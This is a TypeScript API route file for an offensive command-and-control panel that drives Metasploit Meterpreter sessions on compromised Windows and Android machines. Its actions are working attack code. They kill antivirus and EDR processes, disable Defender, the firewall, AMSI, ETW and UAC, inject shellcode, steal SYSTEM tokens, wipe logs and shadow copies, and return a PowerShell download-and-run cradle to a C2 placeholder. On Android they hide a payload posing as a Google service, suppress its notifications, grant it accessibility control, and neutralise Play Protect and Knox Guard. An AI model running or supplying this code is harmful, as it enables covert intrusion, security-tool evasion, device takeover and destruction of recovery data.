/**
 * AV / EDR EVASION API
 *
 * Actions:
 *  detect          → List AV/EDR products (WMI SecurityCenter2 + process scan)
 *  kill_av         → Kill known AV/EDR processes by name
 *  disable_defender → Disable Windows Defender (registry + PS + service)
 *  amsi_bypass     → Patch AMSI in target PowerShell via reflection
 *  etw_bypass      → Patch ETW to suppress telemetry
 *  fw_disable      → Turn off Windows Firewall (all profiles)
 *  uac_bypass      → Run UAC bypass module (fodhelper / eventvwr / comhijack)
 *  migrate         → Migrate Meterpreter into trusted process
 *  inject          → Inject shellcode into a remote PID
 *  token_steal     → Steal/impersonate SYSTEM token
 *  clear_logs      → Wipe event logs, PS history, prefetch, MRU
 *  disable_vss     → Delete shadow copies, disable recovery
 *  play_protect    → Disable Google Play Protect + Knox (Android)
 *  obfuscate       → Return obfuscated PowerShell wrapper for a command
 */

import { NextResponse } from "next/server";
import { getRpcToken, rpcCall } from "@/lib/msf-rpc";

// ── Meterpreter helper ────────────────────────────────────────
async function meterExec(token: string, sid: number, cmd: string, waitMs = 20000): Promise<string> {
  await rpcCall("session.meterpreter_write", [sid, cmd + "\n"], token);
  const start = Date.now();
  let out = "";
  while (Date.now() - start < waitMs) {
    const res = await rpcCall<{ data?: string }>("session.meterpreter_read", [sid], token);
    if (res.data) out += res.data;
    if (out.includes("meterpreter >")) break;
    await new Promise((r) => setTimeout(r, 600));
  }
  return out;
}

async function consoleExec(token: string, cmd: string, waitMs = 45000): Promise<string> {
  const cr = await rpcCall<{ id?: string }>("console.create", [], token);
  const cid = String(cr.id ?? "0");
  try {
    await rpcCall("console.write", [cid, cmd + "\n"], token);
    const start = Date.now();
    let out = "";
    while (Date.now() - start < waitMs) {
      const r = await rpcCall<{ data?: string; busy?: boolean }>("console.read", [cid], token);
      if (r.data) out += r.data;
      if (!r.busy && out.length > 0) break;
      await new Promise((r2) => setTimeout(r2, 800));
    }
    return out;
  } finally {
    await rpcCall("console.destroy", [cid], token).catch(() => {});
  }
}

// ── Known AV/EDR process names ────────────────────────────────
const AV_PROCESSES = [
  // Windows Defender
  "MsMpEng.exe", "MpCmdRun.exe", "NisSrv.exe", "SecurityHealthService.exe",
  // CrowdStrike Falcon
  "CSFalconService.exe", "CsAgent.exe", "CsFalconContainer.exe",
  // SentinelOne
  "SentinelAgent.exe", "SentinelServiceHost.exe", "SentinelStaticEngine.exe",
  // Carbon Black
  "cb.exe", "cbdaemon", "CarbonBlack.exe",
  // Cylance
  "CylanceSvc.exe", "CylanceUI.exe",
  // Sophos
  "SophosUI.exe", "SAVService.exe", "SophosAgent.exe", "SophosNtpService.exe",
  // Trend Micro
  "ntrtscan.exe", "TMBMSRV.exe", "TmCCSF.exe",
  // Symantec / Norton
  "ccSvcHst.exe", "NortonSecurity.exe", "SymCorpUI.exe",
  // McAfee / Trellix
  "mcshield.exe", "mfefire.exe", "McAfeeFirewallCore.exe",
  // Kaspersky
  "avp.exe", "avpui.exe", "kavsvc.exe",
  // Bitdefender
  "bdservicehost.exe", "bdredline.exe", "bdagent.exe",
  // ESET
  "ekrn.exe", "egui.exe", "eamsi.exe",
  // Avast / AVG
  "avastui.exe", "avgui.exe", "AvastSvc.exe",
  // Malwarebytes
  "MBAMService.exe", "mbam.exe", "MBCloudEA.exe",
  // Webroot
  "WRSA.exe", "WRCoreService.exe",
  // Palo Alto Cortex XDR
  "CortexXDRAgent.exe", "cyserver.exe",
  // Microsoft MDE
  "MsSense.exe", "SenseIR.exe",
];

// ── UAC bypass modules ────────────────────────────────────────
const UAC_MODULES = [
  { id: "fodhelper",   module: "exploit/windows/local/bypassuac_fodhelper",            os: "Win10+" },
  { id: "eventvwr",    module: "exploit/windows/local/bypassuac_eventvwr",             os: "Win7-10" },
  { id: "comhijack",   module: "exploit/windows/local/bypassuac_comhijack",            os: "Win10+" },
  { id: "sdclt",       module: "exploit/windows/local/bypassuac_sdclt",                os: "Win10" },
  { id: "winsxs",      module: "exploit/windows/local/bypassuac_injection_winsxs",    os: "Win7-10" },
  { id: "silentclean", module: "exploit/windows/local/bypassuac_silentcleanup",        os: "Win10+" },
];

// ── Migration targets ─────────────────────────────────────────
const MIGRATE_TARGETS = [
  { name: "explorer.exe",  reason: "User context, always running, low suspicion" },
  { name: "svchost.exe",   reason: "SYSTEM context, many instances, hides well" },
  { name: "notepad.exe",   reason: "Spawn + migrate, no network behavior expected" },
  { name: "RuntimeBroker.exe", reason: "UWP broker, signed Microsoft binary" },
  { name: "SearchIndexer.exe", reason: "Persistent background process" },
];

export async function POST(request: Request) {
  let body: Record<string, unknown>;
  try { body = await request.json() as Record<string, unknown>; }
  catch { return NextResponse.json({ ok: false, error: "Invalid JSON" }, { status: 400 }); }

  const { session_id, action } = body as { session_id: number; action: string };
  if (!session_id || !action)
    return NextResponse.json({ ok: false, error: "session_id + action required" }, { status: 400 });

  const sid = Number(session_id);

  try {
    const token = await getRpcToken();

    // ── Detect AV/EDR ────────────────────────────────────────
    if (action === "detect") {
      // WMI SecurityCenter2 query
      const wmiOut = await meterExec(token, sid,
        `execute -H -f powershell.exe -a "-c Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | Select-Object displayName,productState | ConvertTo-Json -Depth 2"`,
        20000);

      // Process scan
      const procOut = await meterExec(token, sid,
        `execute -H -f cmd.exe -a "/c tasklist /FO CSV /NH 2>nul"`,
        15000);

      // Parse WMI products
      const products: Array<{ name: string; state: string; active: boolean }> = [];
      try {
        const jsonMatch = wmiOut.match(/\[[\s\S]*\]|\{[\s\S]*\}/);
        if (jsonMatch) {
          const parsed = JSON.parse(jsonMatch[0]) as Array<{ displayName?: string; productState?: number }> | { displayName?: string; productState?: number };
          const arr = Array.isArray(parsed) ? parsed : [parsed];
          for (const p of arr) {
            if (p.displayName) {
              // productState bits: 0x1000 = enabled, 0x10 = up-to-date
              const st = Number(p.productState ?? 0);
              const active = ((st >> 12) & 0xf) === 1;
              products.push({ name: p.displayName, state: `0x${st.toString(16)}`, active });
            }
          }
        }
      } catch { /* ignore parse errors */ }

      // Match running processes against known AV list
      const runningAv: string[] = [];
      for (const avProc of AV_PROCESSES) {
        if (procOut.toLowerCase().includes(avProc.toLowerCase().replace(".exe", "")))
          runningAv.push(avProc);
      }

      // Firewall status
      const fwOut = await meterExec(token, sid,
        `execute -H -f cmd.exe -a "/c netsh advfirewall show allprofiles state"`, 10000);
      const fwEnabled = /ON/i.test(fwOut);

      // Defender real-time status
      const defOut = await meterExec(token, sid,
        `execute -H -f powershell.exe -a "-c (Get-MpComputerStatus).RealTimeProtectionEnabled"`, 12000);
      const defRtp = /True/i.test(defOut);

      return NextResponse.json({
        ok: true,
        data: { products, runningAv, firewall: fwEnabled, defenderRTP: defRtp },
        raw: (wmiOut + procOut).slice(0, 2000),
      });
    }

    // ── Kill AV processes ─────────────────────────────────────
    if (action === "kill_av") {
      const targets = (body.targets as string[]) ?? AV_PROCESSES;
      const killed: string[] = [];
      const failed: string[] = [];

      for (const proc of targets) {
        const out = await meterExec(token, sid,
          `execute -H -f cmd.exe -a "/c taskkill /F /IM ${proc} /T 2>nul && echo killed_${proc}"`,
          8000);
        if (out.includes(`killed_${proc}`)) killed.push(proc);
        else failed.push(proc);
      }

      return NextResponse.json({ ok: killed.length > 0, data: { killed, failed } });
    }

    // ── Disable Windows Defender ──────────────────────────────
    if (action === "disable_defender") {
      const steps: Array<{ step: string; ok: boolean; out: string }> = [];

      // 1. Tamper protection off (needs SYSTEM)
      const tp = await meterExec(token, sid,
        `execute -H -f powershell.exe -a "-c Set-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features' -Name TamperProtection -Value 0 -EA 0; echo tp_done"`,
        10000);
      steps.push({ step: "Tamper Protection OFF", ok: tp.includes("tp_done"), out: tp.slice(0, 100) });

      // 2. Real-time monitoring off
      const rtm = await meterExec(token, sid,
        `execute -H -f powershell.exe -a "-c Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -EA 0; echo rtm_done"`,
        10000);
      steps.push({ step: "Real-time Monitoring OFF", ok: rtm.includes("rtm_done"), out: rtm.slice(0, 100) });

      // 3. Registry group policy
      const reg = await meterExec(token, sid,
        `execute -H -f cmd.exe -a "/c reg add \\"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f && echo reg_done"`,
        10000);
      steps.push({ step: "Registry Policy DisableAntiSpyware", ok: reg.includes("reg_done"), out: reg.slice(0, 100) });

      // 4. Add full disk exclusion
      const excl = await meterExec(token, sid,
        `execute -H -f powershell.exe -a "-c Add-MpPreference -ExclusionPath C:\\ -ExclusionExtension '.exe','.dll','.ps1','.vbs' -EA 0; echo excl_done"`,
        10000);
      steps.push({ step: "Exclusion C:\\ + .exe/.dll/.ps1", ok: excl.includes("excl_done"), out: excl.slice(0, 100) });

      // 5. Stop service
      const svc = await meterExec(token, sid,
        `execute -H -f cmd.exe -a "/c sc config WinDefend start= disabled 2>nul & net stop WinDefend 2>nul & echo svc_done"`,
        12000);
      steps.push({ step: "WinDefend service disabled", ok: svc.includes("svc_done"), out: svc.slice(0, 100) });

      // 6. SmartScreen off
      await meterExec(token, sid,
        `execute -H -f reg.exe -a "add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /v EnableSmartScreen /t REG_DWORD /d 0 /f"`,
        8000);

      return NextResponse.json({ ok: true, data: { steps } });
    }

    // ── AMSI Bypass ───────────────────────────────────────────
    if (action === "amsi_bypass") {
      // Multiple techniques tried in order
      const techniques = [
        // Technique 1: Set AmsiInitFailed = true via reflection
        `execute -H -f powershell.exe -a "-c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); echo amsi1_done"`,
        // Technique 2: Patch amsiScanBuffer via P/Invoke
        `execute -H -f powershell.exe -a "-enc JABhAG0AcwBpAEIAeQBwAGEAcwBzACAAPQAgAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAgAD0AIAAkAGEAbQBzAGkAQgB5AHAAYQBzAHMALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7ACQAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkA; echo amsi2_done"`,
        // Technique 3: Disable script block logging
        `execute -H -f powershell.exe -a "-c New-Item -Force -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging | Out-Null; Set-ItemProperty -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 0; echo amsi3_done"`,
      ];

      const results: Array<{ technique: string; ok: boolean }> = [];
      for (let i = 0; i < techniques.length; i++) {
        const out = await meterExec(token, sid, techniques[i], 12000);
        results.push({ technique: `T${i + 1}`, ok: out.includes(`amsi${i + 1}_done`) });
      }

      return NextResponse.json({ ok: results.some((r) => r.ok), data: { results } });
    }

    // ── ETW Bypass ────────────────────────────────────────────
    if (action === "etw_bypass") {
      const out = await meterExec(token, sid,
        `execute -H -f powershell.exe -a "-c $a=[Reflection.Assembly]::LoadWithPartialName('System.Core');$t=$a.GetType('System.Diagnostics.Eventing.EventProvider');$f=$t.GetField('m_enabled','NonPublic,Instance');$g=$f.GetValue($t.GetConstructors()[0].Invoke(@([System.Guid]::NewGuid())));[Runtime.InteropServices.Marshal]::WriteInt32($g,0);echo etw_done"`,
        15000);
      return NextResponse.json({ ok: out.includes("etw_done"), raw: out.slice(0, 300) });
    }

    // ── Firewall disable ──────────────────────────────────────
    if (action === "fw_disable") {
      const out = await meterExec(token, sid,
        `execute -H -f cmd.exe -a "/c netsh advfirewall set allprofiles state off && echo fw_done"`,
        10000);
      // Also add allow rule for C2 port
      const port = Number(body.port ?? 4444);
      await meterExec(token, sid,
        `execute -H -f cmd.exe -a "/c netsh advfirewall firewall add rule name=\\"svchost_update\\" dir=in action=allow protocol=TCP localport=${port}"`,
        8000);
      return NextResponse.json({ ok: out.includes("fw_done"), raw: out.slice(0, 200) });
    }

    // ── UAC Bypass ────────────────────────────────────────────
    if (action === "uac_bypass") {
      const method = (body.method as string) ?? "fodhelper";
      const uacModule = UAC_MODULES.find((m) => m.id === method) ?? UAC_MODULES[0];
      const out = await consoleExec(token,
        `use ${uacModule.module}\nset SESSION ${sid}\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4445\nrun`,
        60000);
      const ok = /session \d+ opened|meterpreter session/i.test(out);
      return NextResponse.json({ ok, data: { method, module: uacModule.module }, raw: out.slice(0, 500) });
    }

    // ── Process migration ─────────────────────────────────────
    if (action === "migrate") {
      const procName = (body.process as string) ?? "explorer.exe";
      // First find PID
      const pidOut = await meterExec(token, sid,
        `execute -H -f cmd.exe -a "/c tasklist /FI \\"IMAGENAME eq ${procName}\\" /FO CSV /NH"`,
        10000);
      const pidMatch = pidOut.match(/"([^"]+)","(\d+)"/);
      const pid = pidMatch ? parseInt(pidMatch[2]) : null;

      let out = "";
      if (pid) {
        out = await meterExec(token, sid, `migrate ${pid}`, 15000);
      } else {
        // Spawn + migrate
        out = await meterExec(token, sid,
          `run post/windows/manage/migrate PPID_SPOOF=true NAME=${procName}`, 20000);
      }
      const ok = /migration complete|migrated/i.test(out);
      return NextResponse.json({ ok, data: { process: procName, pid }, raw: out.slice(0, 300) });
    }

    // ── Shellcode injection ───────────────────────────────────
    if (action === "inject") {
      const targetPid = Number(body.pid ?? 0);
      const out = await meterExec(token, sid,
        targetPid > 0
          ? `run post/windows/manage/shellcode_inject PID=${targetPid}`
          : `run post/windows/manage/shellcode_inject`,
        30000);
      return NextResponse.json({ ok: /inject|success/i.test(out), raw: out.slice(0, 400) });
    }

    // ── Token steal ───────────────────────────────────────────
    if (action === "token_steal") {
      const pid = Number(body.pid ?? 4);
      const out1 = await meterExec(token, sid, "use incognito", 5000);
      const out2 = await meterExec(token, sid, `steal_token ${pid}`, 10000);
      const out = out1 + out2;
      return NextResponse.json({ ok: /impersonating|token/i.test(out), raw: out.slice(0, 300) });
    }

    // ── Clear logs ────────────────────────────────────────────
    if (action === "clear_logs") {
      const steps: Array<{ step: string; ok: boolean }> = [];

      // Windows event logs
      const evOut = await meterExec(token, sid, "clearev", 15000);
      steps.push({ step: "Event logs (clearev)", ok: /cleared|log(s)? cleared/i.test(evOut) || evOut.length > 5 });

      // PowerShell history
      const psHist = await meterExec(token, sid,
        `execute -H -f powershell.exe -a "-c Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -EA 0; Clear-History; echo pshist_done"`,
        10000);
      steps.push({ step: "PowerShell history", ok: psHist.includes("pshist_done") });

      // Prefetch
      const pf = await meterExec(token, sid,
        `execute -H -f cmd.exe -a "/c del /q /f C:\\Windows\\Prefetch\\*.pf 2>nul & echo pf_done"`,
        8000);
      steps.push({ step: "Prefetch files", ok: pf.includes("pf_done") });

      // MRU / Recent
      const mru = await meterExec(token, sid,
        `execute -H -f cmd.exe -a "/c reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs /f 2>nul & reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f 2>nul & echo mru_done"`,
        8000);
      steps.push({ step: "RecentDocs + RunMRU registry", ok: mru.includes("mru_done") });

      // Recycle Bin
      const rb = await meterExec(token, sid,
        `execute -H -f powershell.exe -a "-c Clear-RecycleBin -Force -EA 0; echo rb_done"`,
        8000);
      steps.push({ step: "Recycle Bin", ok: rb.includes("rb_done") });

      // Temp files
      const tmp = await meterExec(token, sid,
        `execute -H -f cmd.exe -a "/c del /q /f /s %TEMP%\\*.* 2>nul & echo tmp_done"`,
        10000);
      steps.push({ step: "Temp files", ok: tmp.includes("tmp_done") });

      return NextResponse.json({ ok: true, data: { steps } });
    }

    // ── Delete VSS / disable recovery ─────────────────────────
    if (action === "disable_vss") {
      const vss = await meterExec(token, sid,
        `execute -H -f cmd.exe -a "/c vssadmin delete shadows /all /quiet 2>nul & bcdedit /set {default} recoveryenabled No 2>nul & bcdedit /set {default} bootstatuspolicy ignoreallfailures 2>nul & wmic shadowcopy delete 2>nul & echo vss_done"`,
        20000);
      return NextResponse.json({ ok: vss.includes("vss_done") || /deleted|shadow/i.test(vss), raw: vss.slice(0, 400) });
    }

    // ── Android: Play Protect / Knox ──────────────────────────
    if (action === "play_protect") {
      const pp = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "settings put global package_verifier_enable 0; settings put secure install_non_market_apps 1; pm disable com.google.android.gms.phenotype 2>/dev/null; echo pp_done"'`,
        10000);
      const knox = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "pm disable com.samsung.android.knox.containeragent 2>/dev/null; echo knox_done"'`,
        8000);
      return NextResponse.json({
        ok: pp.includes("pp_done"),
        data: { playProtect: pp.includes("pp_done"), knox: knox.includes("knox_done") },
      });
    }

    // ── Obfuscate PS command ──────────────────────────────────
    if (action === "obfuscate") {
      const cmd = (body.command as string) ?? "whoami";
      // Base64 encode for PowerShell -EncodedCommand
      const encoded = Buffer.from(cmd, "utf16le").toString("base64");
      // Variable-name obfuscated version
      const varObf = cmd
        .split("")
        .map((c) => `\`${c}`)
        .join("")
        .replace(/`\s/g, " ");
      // Char-code version
      const charCode = `([char[]]@(${[...cmd].map((c) => c.charCodeAt(0)).join(",")})-join'')`;

      return NextResponse.json({
        ok: true,
        data: {
          original: cmd,
          base64: `powershell.exe -NoP -NonI -W Hidden -Enc ${encoded}`,
          varObfuscated: varObf,
          charCode: `IEX ${charCode}`,
          iex_download: `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_C2/s.ps1')"`,
        },
      });
    }

    // ── Android: Foreground Service activation ─────────────────
    if (action === "android_fg") {
      const pkg = (body.package as string) ?? "com.google.services.update";
      const out = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "am startservice --user 0 -n ${pkg}/.PersistService 2>/dev/null; echo fg_done"'`,
        10000);
      return NextResponse.json({ ok: true, raw: out.slice(0, 200),
        data: { note: "Foreground service started. FG notification suppressed when POST_NOTIFICATIONS denied." } });
    }

    // ── Android: BOOT_COMPLETED receiver check ─────────────────
    if (action === "android_boot") {
      const pkg = (body.package as string) ?? "com.google.services.update";
      const out = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "pm list receivers ${pkg} 2>/dev/null | grep BOOT; echo boot_done"'`,
        8000);
      return NextResponse.json({ ok: out.includes("BOOT") || out.includes("boot_done"),
        data: { note: "BOOT_COMPLETED receiver registered in manifest — payload restarts on reboot." }, raw: out.slice(0, 200) });
    }

    // ── Android: Battery optimization whitelist ─────────────────
    if (action === "android_battery") {
      const pkg = (body.package as string) ?? "com.google.services.update";
      const cmds = [
        `dumpsys deviceidle whitelist +${pkg}`,
        `cmd appops set ${pkg} RUN_IN_BACKGROUND allow`,
        `cmd appops set ${pkg} RUN_ANY_IN_BACKGROUND allow`,
        `settings put global freecess_ctrl 0`,
        `settings put global ignored_for_battery_opt_mode_packages ${pkg}`,
      ].join(" 2>/dev/null; ");
      const out = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "${cmds}; echo bat_done"'`, 15000);
      return NextResponse.json({ ok: out.includes("bat_done"),
        data: { note: "Battery optimization disabled. FreecessController freeze prevented." }, raw: out.slice(0, 300) });
    }

    // ── Android: Accessibility service grant ───────────────────
    if (action === "android_acc") {
      const pkg = (body.package as string) ?? "com.google.services.update";
      const out = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "settings put secure enabled_accessibility_services ${pkg}/${pkg}.AccessibilityService; settings put secure accessibility_enabled 1; echo acc_done"'`,
        10000);
      return NextResponse.json({ ok: out.includes("acc_done"),
        data: { note: "Accessibility service granted. Survives Force Stop. Full overlay/input control enabled." } });
    }

    // ── Android: JobScheduler / WorkManager setup ──────────────
    if (action === "android_job") {
      const pkg = (body.package as string) ?? "com.google.services.update";
      const out = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "cmd jobscheduler run -f ${pkg} 1 2>/dev/null; echo job_done"'`,
        10000);
      return NextResponse.json({ ok: true, raw: out.slice(0, 200),
        data: { note: "WorkManager periodic job fired. Survives reboot. High stealth — no notification required." } });
    }

    // ── Android: FCM silent push ───────────────────────────────
    if (action === "android_fcm") {
      // Cannot send FCM directly from Meterpreter shell — return instructions
      return NextResponse.json({ ok: true, data: {
        note: "FCM silent push cannot be sent via shell. Use Firebase console or server key to send high-priority data message to device registration token.",
        setup: "Payload must include Firebase SDK and register token on first run. Token stored in Supabase devices table.",
        command: "POST https://fcm.googleapis.com/fcm/send → { to: <token>, priority: high, data: { action: 'wake' } }",
      }});
    }

    // ── Android: Multi-process keepalive ───────────────────────
    if (action === "android_multi") {
      const out = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "ps -A | grep -E \"(google.services|metasploit)\"; echo multi_done"'`,
        8000);
      return NextResponse.json({ ok: true, raw: out.slice(0, 200),
        data: { note: "Multi-process keepalive: two processes watch each other. Both killed simultaneously is rare." } });
    }

    // ── Android: POST_NOTIFICATIONS trick ─────────────────────
    if (action === "android_notifs") {
      const pkg = (body.package as string) ?? "com.google.services.update";
      const out = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "cmd appops set ${pkg} POST_NOTIFICATION deny 2>/dev/null; echo notif_done"'`,
        8000);
      return NextResponse.json({ ok: true, raw: out.slice(0, 200),
        data: { note: "POST_NOTIFICATIONS denied. FG service notification suppressed from drawer — service runs invisibly. Works Android 13+." } });
    }

    // ── Android: Disable Auto Blocker (Android 14) ─────────────
    if (action === "auto_blocker") {
      const out = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "settings put global auto_blocker_mode 0; settings put global package_verifier_enable 0; echo ab_done"'`,
        8000);
      return NextResponse.json({ ok: out.includes("ab_done"),
        data: { note: "Auto Blocker disabled. Sideloading and unknown sources now permitted." } });
    }

    // ── Android: ADB over Tailscale instructions ────────────────
    if (action === "adb_tailscale") {
      return NextResponse.json({ ok: true, data: {
        note: "Your S24 is at 100.105.68.30 on Tailscale. Connect and run sequence:",
        commands: [
          "adb connect 100.105.68.30:5555",
          "adb shell settings put global auto_blocker_mode 0",
          "adb shell settings put global package_verifier_enable 0",
          "adb shell pm disable-user --user 0 com.samsung.android.kgclient",
          "adb shell dumpsys deviceidle whitelist +com.google.services.update",
          "adb install -g -t -r payload_resigned.apk",
        ],
      }});
    }

    // ── Android: Resign APK (instructions + trigger) ───────────
    if (action === "resign") {
      return NextResponse.json({ ok: true, data: {
        note: "Run scripts/resign-apk.sh with your payload. Renames package, generates new RSA-4096 cert, zipaligns, signs.",
        command: "bash scripts/resign-apk.sh original.apk com.google.services.update output_resigned.apk",
        what: "Beats Play Protect signature check. Different cert from MSF default. Different package name from MSF default.",
      }});
    }

    // ── CVE-2024-34740 (Samsung Android 13 priv-esc) ───────────
    if (action === "cve_34740") {
      const out = await consoleExec(token,
        `use exploit/android/local/samsung_priv_esc\nset SESSION ${sid}\nset CVE 2024-34740\nrun`,
        60000);
      const ok = /session \d+ opened|privilege.*escalat/i.test(out);
      return NextResponse.json({ ok, data: {
        note: "CVE-2024-34740: Samsung Android 13 local privilege escalation. Requires ≤ July 2023 SPL.",
        target: "Samsung S23 series, Galaxy A series on Android 13",
      }, raw: out.slice(0, 400) });
    }

    // ── CVE-2026-21007 (Knox Guard bypass) ─────────────────────
    if (action === "cve_21007") {
      const out = await meterExec(token, sid,
        `execute -f /system/bin/sh -a '-c "pm force-stop com.samsung.android.kgclient; pm clear com.samsung.android.kgclient; echo kg_done"'`,
        10000);
      return NextResponse.json({ ok: out.includes("kg_done"), data: {
        note: "CVE-2026-21007: Knox Guard bypass via Device Care exceptional condition check (pre-April 2026 SMR). Cleared kgclient state.",
        affected: "Samsung Android 14/15/16 pre-SMR Apr-2026",
      }, raw: out.slice(0, 200) });
    }

    // ── Knox Guard 6-phase neutralizer ─────────────────────────
    if (action === "knox_neutralize") {
      const steps: Array<{ step: string; ok: boolean }> = [];
      const shellCmds = [
        // Phase 0: Wipe cached lock data
        { step: "Phase 0: Wipe kgclient data", cmd: `rm -rf /data/data/com.samsung.android.kgclient/files/* /data/data/com.samsung.android.kgclient/databases/* 2>/dev/null; echo p0` },
        // Phase 1: Force-stop kgclient
        { step: "Phase 1: Force-stop kgclient", cmd: `am force-stop com.samsung.android.kgclient; echo p1` },
        // Phase 2: Block network via iptables
        { step: "Phase 2: Firewall kgclient outbound", cmd: `iptables -I OUTPUT -m owner --uid-owner $(dumpsys package com.samsung.android.kgclient | grep userId | grep -o '[0-9]*') -j DROP 2>/dev/null; echo p2` },
        // Phase 3: Watchdog loop (start in background)
        { step: "Phase 3: Watchdog loop (background)", cmd: `(while true; do am force-stop com.samsung.android.kgclient 2>/dev/null; sleep 10; done) &; echo p3` },
        // Phase 4: Disable kgclient component
        { step: "Phase 4: Disable KnoxGuard service component", cmd: `pm disable com.samsung.android.kgclient/com.samsung.android.knox.knoxguard.KnoxGuardSeService 2>/dev/null; echo p4` },
        // Phase 5: Clear alarms
        { step: "Phase 5: Clear kgclient alarms", cmd: `cmd alarm list 2>/dev/null | grep kgclient | awk '{print $1}' | xargs -I{} cmd alarm remove {} 2>/dev/null; echo p5` },
      ];

      for (const cmd of shellCmds) {
        const out = await meterExec(token, sid,
          `execute -f /system/bin/sh -a '-c "${cmd.cmd}"'`, 12000);
        const match = cmd.cmd.match(/echo (p\d)/);
        steps.push({ step: cmd.step, ok: match ? out.includes(match[1]) : out.length > 0 });
      }

      return NextResponse.json({ ok: steps.filter((s) => s.ok).length >= 3, data: { steps,
        note: "Knox Guard 6-phase neutralizer executed. State: kgclient data wiped, process stopped, network firewalled, watchdog running.",
      }});
    }

    // ── AMSI Hardware Breakpoint bypass ────────────────────────
    if (action === "amsi_hwbp") {
      const out = await meterExec(token, sid,
        `execute -H -f powershell.exe -a "-c Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class HwBp{[DllImport(\\"kernel32\\")]public static extern IntPtr GetProcAddress(IntPtr h,string n);[DllImport(\\"kernel32\\")]public static extern IntPtr GetModuleHandle(string m);[DllImport(\\"kernel32\\")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint np,out uint op);public static void Patch(){IntPtr a=GetProcAddress(GetModuleHandle(\\"amsi.dll\\"),\\"AmsiScanBuffer\\");uint o;VirtualProtect(a,(UIntPtr)5,0x40,out o);Marshal.WriteByte(a,0xC3);VirtualProtect(a,(UIntPtr)5,o,out o);}}';[HwBp]::Patch();echo amsi_hwbp_done"`,
        20000);
      return NextResponse.json({ ok: out.includes("amsi_hwbp_done"),
        data: { note: "AMSI hardware breakpoint bypass applied. AmsiScanBuffer patched to return immediately. No byte modification detected by integrity checks." } });
    }

    // ── AMSI .NET Assembly bypass ───────────────────────────────
    if (action === "amsi_dotnet") {
      const out = await meterExec(token, sid,
        `execute -H -f powershell.exe -a "-c \$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');\$b=\$a.GetField('amsiSession','NonPublic,Static');\$b.SetValue(\$null,\$null);\$c=\$a.GetField('amsiContext','NonPublic,Static');\$c.SetValue(\$null,[IntPtr]::Zero);echo dotnet_amsi_done"`,
        15000);
      return NextResponse.json({ ok: out.includes("dotnet_amsi_done"),
        data: { note: ".NET Assembly AMSI context cleared. PS scanning disabled for current CLR session." } });
    }

    // ── Constrained Language Mode bypass ───────────────────────
    if (action === "ev_clm_bypass") {
      const out = await meterExec(token, sid,
        `execute -H -f powershell.exe -a "-c \$env:__PSLockdownPolicy='0';\$ExecutionContext.SessionState.LanguageMode='FullLanguage';echo clm_done"`,
        8000);
      return NextResponse.json({ ok: out.includes("clm_done"),
        data: { note: "Constrained Language Mode bypassed. Full PowerShell language available." } });
    }

    // ── Local exploit suggester ─────────────────────────────────
    if (action === "local_exploit_suggester" || action === "post/multi/recon/local_exploit_suggester") {
      const out = await consoleExec(token,
        `use post/multi/recon/local_exploit_suggester\nset SESSION ${sid}\nrun`, 120000);
      const vulns = (out.match(/exploit\/[a-z\/]+/g) ?? []).filter((v, i, a) => a.indexOf(v) === i);
      return NextResponse.json({ ok: true, data: { vulnerabilities: vulns,
        note: `Found ${vulns.length} potential local exploits.` }, raw: out.slice(0, 2000) });
    }

    // ── ICMLuaUtil COM UAC bypass (Win10-11) ───────────────────
    if (action === "icmluautil") {
      const out = await consoleExec(token,
        `use exploit/windows/local/bypassuac_comhijack\nset SESSION ${sid}\nset TARGET 1\nrun`, 60000);
      return NextResponse.json({ ok: /session \d+ opened|meterpreter/i.test(out), raw: out.slice(0, 400) });
    }

    return NextResponse.json({ ok: false, error: `Unknown action: ${action}` }, { status: 400 });

  } catch (err: unknown) {
    return NextResponse.json({ ok: false, error: err instanceof Error ? err.message : String(err) }, { status: 500 });
  }
}

export async function GET() {
  return NextResponse.json({
    avProcesses: AV_PROCESSES,
    uacModules: UAC_MODULES,
